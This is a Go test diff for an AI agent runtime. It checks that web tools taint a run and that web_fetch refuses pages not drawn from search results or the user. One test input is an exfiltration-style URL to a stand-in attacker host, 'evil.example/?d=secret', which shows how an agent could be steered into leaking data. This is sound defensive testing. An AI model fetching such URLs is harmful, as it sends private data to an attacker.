@@ -1,6 +1,7 @@
 package runs
 
 import (
+	"context"
 	"encoding/base64"
 	"strings"
 	"testing"
@@ -38,5 +39,21 @@ func TestPageTextKeepsTitleImageAndDropsScripts(t *testing.T) {
 func TestSearchAndFetchTaintTheRun(t *testing.T) {
 	if !untrustedTool("web_search") || !untrustedTool("web_fetch") {
 		t.Fatal("web tools must taint the run")
+	}
+}
+
+func TestFetchOnlyReadsPagesFromSearchOrThePerson(t *testing.T) {
+	rc := &runCtx{}
+	ctx := withRun(context.Background(), rc)
+	r := &Runtime{}
+	if _, err := r.webFetch(ctx, fetchIn{URL: "https://evil.example/?d=secret"}); err == nil || !strings.Contains(err.Error(), "search result") {
+		t.Fatalf("unseen page was not refused: %v", err)
+	}
+	rc.allowFetch("https://example.com/echo/")
+	if !rc.mayFetch("https://example.com/echo") {
+		t.Fatal("a page from a search must be readable, trailing slash or not")
+	}
+	if rc.mayFetch("https://example.com/echo?x=1") {
+		t.Fatal("a changed query must not be readable")
 	}
 }
